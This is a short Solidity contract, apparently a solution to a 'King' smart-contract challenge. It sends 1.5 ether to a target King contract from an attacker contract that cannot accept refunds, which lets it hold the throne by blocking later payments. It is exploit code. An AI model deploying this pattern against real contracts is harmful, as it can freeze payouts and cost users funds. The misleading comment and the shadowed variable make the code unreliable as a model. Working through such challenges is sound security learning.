// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    King public king;

    // Impersonate king contract address
    constructor(King _king) payable {
        king = King(_king);
    }

    function hackContract() public payable{
        address king = payable(king);

        king.call{value: 1.5 ether}("");
    }
}
